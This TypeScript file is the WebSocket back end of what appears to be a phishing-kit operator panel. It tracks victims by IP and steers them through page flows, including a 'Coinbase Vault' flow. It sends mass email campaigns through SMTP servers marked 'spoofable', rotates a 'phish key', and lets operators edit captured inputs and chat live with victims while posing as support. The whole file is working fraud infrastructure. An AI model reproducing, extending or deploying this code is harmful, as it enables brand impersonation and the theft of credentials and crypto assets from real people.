import { WebSocketServer, type WebSocket } from 'ws';
import type { Server, IncomingMessage } from 'http';
import type { Duplex } from 'stream';
import { serverState, type ClientEvent, type ServerEvent } from './state.js';
import { startSimulator } from './simulator.js';
import { addSmtpConfig, removeSmtpConfig, sendCampaign } from './mailer.js';
import {
	dbGetConversationByIp,
	dbUpsertConversation,
	dbInsertMessage,
	dbMarkMessagesRead,
	dbUpsertVaultCase,
	dbUpdateVaultCase,
	dbDeleteVaultCase,
	dbGetVaultCases,
	dbSetVisitorFlowSteps,
	dbUpsertVisitor
} from './database.js';
import { getSessionUser, type SessionUser } from './auth.js';

const PANEL_HOST = (process.env.PANEL_HOST || '').toLowerCase();

let wss: WebSocketServer | null = null;
const clients: Set<WebSocket> = new Set();
let simulatorStarted = false;

function parseCookie(header: string | undefined, name: string): string | undefined {
	if (!header) return undefined;
	for (const part of header.split(';')) {
		const [k, ...rest] = part.trim().split('=');
		if (k === name) return rest.join('=');
	}
	return undefined;
}

const ADMIN_EVENTS = new Set<string>([
	'users:create', 'users:delete', 'users:list',
	'domains:add', 'domains:delete',
	'settings:update', 'settings:server', 'settings:client',
	'profile:update', 'profile:rotate-key',
	'flow:create', 'flow:update', 'flow:delete',
	'mailer:send', 'mailer:smtp:add', 'mailer:smtp:remove',
	'inbox:add', 'inbox:remove', 'inbox:refresh',
	'vault:update', 'vault:delete',
	'visitor:delete', 'visitors:delete',
	'visitor:redirect', 'visitor:bypass-flow', 'visitor:set-last-two',
	'visitor:set-email-masks', 'visitor:promote-vault', 'visitor:push',
	'visitor:setinputs', 'visitor:screen', 'visitor:export',
	'visitor:livechat-open', 'livechat:operator:send', 'livechat:operator:read',
	'flow:clear', 'flow:reorder',
	'chat:send', 'chat:delete', 'chat:list',
	'admin:link', 'stats:request'
]);

export function broadcast(event: ServerEvent): void {
	const message = JSON.stringify(event);
	for (const client of clients) {
		if (client.readyState === 1) {
			client.send(message);
		}
	}
}

export function broadcastStats(): void {
	broadcast({ type: 'stats:updated', payload: serverState.getStats() });
}

function handleClientMessage(data: string): void {
	let event: ClientEvent;
	try {
		event = JSON.parse(data);
	} catch {
		return;
	}

	switch (event.type) {
		case 'visitor:push': {
			const { ip, targetFlow } = event.payload;
			let visitor = serverState.pushVisitor(ip, targetFlow);
			if (visitor) {
				const flow = serverState.flows.find((f) => f.name === targetFlow);
				if (flow?.steps?.length && /^[A-Z][^\/]+\/.+/.test(flow.steps[0])) {
					visitor = serverState.setVisitorLastPage(ip, flow.steps[0]) ?? visitor;
				}
				const logEntry = serverState.addLogEntry(
					`admin pushed visitor to ${targetFlow}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
				broadcastStats();
			}
			break;
		}
		case 'settings:update': {
			serverState.updateHost(event.payload);
			const logEntry = serverState.addLogEntry(
				`admin updated settings for host ${event.payload.domain}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			broadcast({
				type: 'init',
				payload: serverState.getInitPayload()
			});
			break;
		}
		case 'flow:create': {
			serverState.addFlow(event.payload);
			broadcast({ type: 'flows:updated', payload: serverState.flows });
			break;
		}
		case 'flow:update': {
			serverState.updateFlow(event.payload);
			broadcast({ type: 'flows:updated', payload: serverState.flows });
			break;
		}
		case 'flow:delete': {
			serverState.deleteFlow(event.payload.id);
			broadcast({ type: 'flows:updated', payload: serverState.flows });
			break;
		}
		case 'mailer:send': {
			const { recipients, templateId, subject, senderEmail, senderName, smtpId, html: emailHtml } = event.payload;
			const html = emailHtml || '';
			const logEntry = serverState.addLogEntry(
				`admin sending campaign to ${recipients.length} recipients (template ${templateId})`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });

			if (!smtpId) {
				broadcast({ type: 'mailer:result', payload: { sent: 0, failed: recipients.length, total: recipients.length, errors: ['No SMTP server selected'] } });
				break;
			}

			sendCampaign({
				smtpId,
				recipients,
				subject: subject || 'No Subject',
				html,
				fromEmail: senderEmail,
				fromName: senderName
			}).then((results) => {
				const sent = results.filter(r => r.success).length;
				const failed = results.filter(r => !r.success).length;
				const errors = results.filter(r => !r.success).map(r => `${r.recipient}: ${r.error}`);

				const resultLog = serverState.addLogEntry(
					`Campaign complete: ${sent}/${results.length} sent successfully`,
					sent === results.length ? 'action' : 'alert'
				);
				broadcast({ type: 'log:new', payload: resultLog });
				broadcast({ type: 'mailer:result', payload: { sent, failed, total: results.length, errors } });
			});
			break;
		}
		case 'mailer:smtp:add': {
			const id = event.payload.id || String(Date.now());
			addSmtpConfig({
				id,
				host: event.payload.host,
				port: event.payload.port,
				user: event.payload.user,
				password: event.payload.password,
				useSSL: event.payload.useSSL ?? false,
				spoofable: event.payload.spoofable ?? false
			});
			const logEntry = serverState.addLogEntry(
				`admin added SMTP server ${event.payload.host}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'mailer:smtp:remove': {
			removeSmtpConfig(event.payload.id);
			const logEntry = serverState.addLogEntry(
				`admin removed SMTP server`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'users:create': {
			const user = serverState.addUser(
				event.payload.username,
				event.payload.role as 'admin' | 'user',
				event.payload.password
			);
			broadcast({ type: 'users:updated', payload: serverState.users });
			const logEntry = serverState.addLogEntry(
				`admin created user ${user.username}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'users:delete': {
			serverState.deleteUser(event.payload.id);
			broadcast({ type: 'users:updated', payload: serverState.users });
			const logEntry = serverState.addLogEntry(
				`admin deleted a user account`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'users:list': {
			broadcast({ type: 'users:updated', payload: serverState.users });
			break;
		}
		case 'stats:request': {
			broadcastStats();
			break;
		}
		case 'domains:add': {
			const domain = serverState.addDomain(event.payload.domain);
			broadcast({ type: 'domains:updated', payload: serverState.domains });
			const logEntry = serverState.addLogEntry(
				`admin added domain ${domain.domain}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'domains:delete': {
			serverState.deleteDomain(event.payload.id);
			broadcast({ type: 'domains:updated', payload: serverState.domains });
			const logEntry = serverState.addLogEntry(
				`admin removed a domain`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'inbox:add': {
			const account = serverState.addInboxAccount(event.payload.email);
			broadcast({ type: 'inbox:updated', payload: serverState.inboxAccounts });
			const logEntry = serverState.addLogEntry(
				`admin added inbox account ${account.email}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'inbox:remove': {
			serverState.removeInboxAccount(event.payload.id);
			broadcast({ type: 'inbox:updated', payload: serverState.inboxAccounts });
			break;
		}
		case 'inbox:refresh': {
			broadcast({ type: 'inbox:updated', payload: serverState.inboxAccounts });
			break;
		}
		case 'settings:server': {
			serverState.serverSettings = event.payload;
			const logEntry = serverState.addLogEntry(
				`admin updated server settings`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'settings:client': {
			serverState.clientSettings = event.payload;
			break;
		}
		case 'profile:update': {
			const parts: string[] = [];
			if (event.payload.username) parts.push('username');
			if (event.payload.password) parts.push('password');
			const logEntry = serverState.addLogEntry(
				`admin updated their ${parts.length ? parts.join(' and ') : 'profile'}`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'profile:rotate-key': {
			const logEntry = serverState.addLogEntry(
				`admin rotated phish key`,
				'action'
			);
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'visitor:redirect': {
			const { ip, template } = event.payload;
			const visitor = serverState.setVisitorLastPage(ip, template);
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin redirected ${ip} to ${template}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'visitor:bypass-flow': {
			const { ip, bypassed } = event.payload;
			const visitor = serverState.setVisitorBypass(ip, bypassed);
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin ${bypassed ? 'bypassed' : 'resumed'} flow for ${ip}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'visitor:set-last-two': {
			const { ip, digits } = event.payload;
			const cleaned = (digits || '').replace(/\D/g, '').slice(-2);
			const visitor = serverState.setVisitorLastTwo(ip, cleaned);
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin set last 2 digits for ${ip}: ${cleaned || '—'}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'visitor:set-email-masks': {
			const { ip, emailFrom, emailTo } = event.payload;
			const visitor = serverState.setVisitorEmailMasks(ip, emailFrom || '', emailTo || '');
			if (visitor) {
				const logEntry = serverState.addLogEntry(
					`admin set email masks for ${ip}: from=${emailFrom || '—'} to=${emailTo || '—'}`,
					'action'
				);
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'visitor:promote-vault': {
			const { ip } = event.payload;
			const visitor = serverState.visitors.get(ip);
			if (visitor) {
				visitor.module = 'Coinbase Vault';
				dbUpsertVaultCase({
					visitorIp: ip,
					module: visitor.module,
					location: [visitor.city, visitor.region].filter(Boolean).join(', '),
					capturedBy: visitor.capturedBy
				});

				const vaultFlow = serverState.flows.find(
					(f) =>
						f.active &&
						(f.name.toLowerCase().includes('vault') ||
							f.steps.some((s) => /vault/i.test(s)))
				);
				let promotedSuffix = '';
				if (vaultFlow && vaultFlow.steps.length > 0) {
					const firstStep = vaultFlow.steps[0];
					if (/^[A-Z][^/]+\/.+/.test(firstStep)) {
						visitor.flowSteps = vaultFlow.steps.map((p) => ({ page: p, passed: false }));
						visitor.flow = vaultFlow.name;
						visitor.flowBypassed = false;
						try { dbSetVisitorFlowSteps(ip, visitor.flowSteps); } catch { /* non-critical */ }
						serverState.setVisitorLastPage(ip, firstStep);
						promotedSuffix = ` → flow "${vaultFlow.name}"`;
					}
				} else {
					// No vault flow defined — default to Coinbase/Vault Setup as the entry
					const defaultEntry = 'Coinbase/Vault Setup';
					visitor.flowSteps = [];
					try { dbSetVisitorFlowSteps(ip, []); } catch { /* non-critical */ }
					serverState.setVisitorLastPage(ip, defaultEntry);
					promotedSuffix = ` → ${defaultEntry}`;
				}

				try { dbUpsertVisitor(visitor); } catch { /* non-critical */ }

				const logEntry = serverState.addLogEntry(`admin promoted ${ip} to Vault${promotedSuffix}`, 'action');
				broadcast({ type: 'visitor:updated', payload: visitor });
				broadcast({ type: 'vault:updated', payload: { ip } });
				broadcast({ type: 'log:new', payload: logEntry });
			}
			break;
		}
		case 'livechat:operator:send': {
			const { ip, body } = event.payload;
			if (!ip || !body || !body.trim()) break;
			const visitor = serverState.visitors.get(ip);
			let conv = dbGetConversationByIp(ip);
			if (!conv) conv = dbUpsertConversation(ip, visitor?.module || '');
			const msg = dbInsertMessage({
				conversationId: conv.id,
				sender: 'operator',
				authorName: 'admin',
				body: body.trim(),
				seen: true,
				createdAt: Date.now()
			});
			broadcast({
				type: 'livechat:msg:new',
				payload: { conversationId: conv.id, visitorIp: ip, message: msg }
			});
			break;
		}
		case 'livechat:operator:read': {
			const { ip } = event.payload;
			const conv = dbGetConversationByIp(ip);
			if (conv) {
				dbMarkMessagesRead(conv.id);
				broadcast({ type: 'livechat:msg:read', payload: { conversationId: conv.id, visitorIp: ip } });
			}
			break;
		}
		case 'vault:update': {
			const { id, ...patch } = event.payload;
			dbUpdateVaultCase(id, patch);
			broadcast({ type: 'vault:updated', payload: { id } });
			break;
		}
		case 'vault:delete': {
			dbDeleteVaultCase(event.payload.id);
			broadcast({ type: 'vault:updated', payload: { deleted: event.payload.id } });
			break;
		}
		case 'visitor:livechat-open': {
			break;
		}
		case 'visitor:export': {
			const { ip } = event.payload;
			const logEntry = serverState.addLogEntry(`admin exported visitor ${ip}`, 'action');
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'visitor:setinputs': {
			const { ip, inputs } = event.payload;
			const visitor = serverState.visitors.get(ip);
			if (visitor) {
				Object.assign(visitor.inputs, inputs);
				broadcast({ type: 'visitor:updated', payload: visitor });
			}
			break;
		}
		case 'visitor:screen': {
			const visitor = serverState.visitors.get(event.payload.ip);
			if (visitor) {
				broadcast({ type: 'visitor:screen:data', payload: { ip: event.payload.ip, src: '' } });
			}
			break;
		}
		case 'visitor:delete': {
			const { ip } = event.payload;
			serverState.deleteVisitor(ip);
			const logEntry = serverState.addLogEntry(`admin deleted visitor ${ip}`, 'action');
			broadcast({ type: 'visitor:disconnected', payload: { ip } });
			broadcast({ type: 'log:new', payload: logEntry });
			broadcastStats();
			break;
		}
		case 'visitors:delete': {
			serverState.deleteAllVisitors();
			const logEntry = serverState.addLogEntry('admin deleted all visitors', 'action');
			broadcast({ type: 'init', payload: serverState.getInitPayload() });
			broadcast({ type: 'log:new', payload: logEntry });
			break;
		}
		case 'flow:clear': {
			const visitor = serverState.visitors.get(event.payload.ip);
			if (visitor) {
				visitor.flowSteps = [];
				visitor.flow = '';
				try { dbSetVisitorFlowSteps(visitor.ip, []); } catch { /* non-critical */ }
				broadcast({ type: 'visitor:updated', payload: visitor });
			}
			break;
		}
		case 'flow:reorder': {
			const visitor = serverState.visitors.get(event.payload.ip);
			if (visitor) {
				visitor.flowSteps = (event.payload.order || []).map((s: any) => ({
					page: String(s.page || ''),
					passed: !!s.passed || !/^[A-Z][^/]+\/.+/.test(String(s.page || ''))
				}));
				try { dbSetVisitorFlowSteps(visitor.ip, visitor.flowSteps); } catch { /* non-critical */ }
				broadcast({ type: 'visitor:updated', payload: visitor });
			}
			break;
		}
		case 'chat:send': {
			const msg = {
				id: String(Date.now()),
				user: 'admin',
				message: event.payload.text,
				time: new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: '2-digit', hour12: true }),
				timestamp: Date.now()
			};
			serverState.chatMessages.push(msg);
			if (serverState.chatMessages.length > 200) serverState.chatMessages.shift();
			broadcast({ type: 'chat:new', payload: msg });
			break;
		}
		case 'chat:list': {
			broadcast({ type: 'chat:list', payload: serverState.chatMessages });
			break;
		}
		case 'chat:delete': {
			serverState.chatMessages = [];
			broadcast({ type: 'chat:list', payload: [] });
			break;
		}
		case 'admin:link': {
			const domain = serverState.hosts.length > 0 ? serverState.hosts[0].domain : 'localhost';
			broadcast({ type: 'admin:link', payload: { on: true, domain, auth: serverState.adminLinkAuth } });
			break;
		}
	}
}

export function setupWebSocket(server: Server): WebSocketServer {
	if (wss) return wss;

	wss = new WebSocketServer({ noServer: true });

	server.on('upgrade', (req: IncomingMessage, socket: Duplex, head: Buffer) => {
		const url = new URL(req.url || '/', `http://${req.headers.host || 'localhost'}`);
		if (url.pathname !== '/ws') {
			socket.destroy();
			return;
		}

		if (PANEL_HOST) {
			const reqHost = (req.headers.host || '').split(':')[0].toLowerCase();
			if (reqHost !== PANEL_HOST) {
				socket.destroy();
				return;
			}
		}

		const token = parseCookie(req.headers.cookie, 'panel_session');
		const user = getSessionUser(token);
		if (!user) {
			socket.write('HTTP/1.1 401 Unauthorized\r\n\r\n');
			socket.destroy();
			return;
		}

		wss!.handleUpgrade(req, socket, head, (ws) => {
			wss!.emit('connection', ws, req, user);
		});
	});

	wss.on('connection', (socket: WebSocket, _req: IncomingMessage, user: SessionUser) => {
		clients.add(socket);

		const initPayload = serverState.getInitPayload();
		socket.send(JSON.stringify({ type: 'init', payload: initPayload }));

		const logEntry = serverState.addLogEntry(`${user.username} signed in`, 'connect');
		broadcast({ type: 'log:new', payload: logEntry });
		broadcastStats();

		socket.on('message', (raw) => {
			const data = raw.toString();
			let parsed: ClientEvent;
			try { parsed = JSON.parse(data); } catch { return; }

			if (ADMIN_EVENTS.has(parsed.type) && user.role !== 'admin') {
				return;
			}

			handleClientMessage(data);
		});

		socket.on('close', () => {
			clients.delete(socket);
		});
	});

	const demoMode = process.env.DEMO_MODE === 'true';
	if (!simulatorStarted && demoMode) {
		simulatorStarted = true;
		startSimulator();
		console.log('[ws] Simulator started (DEMO_MODE=true)');
	} else if (!demoMode) {
		console.log('[ws] Real API mode (no simulator). Send data via POST /api/* endpoints.');
	}

	return wss;
}
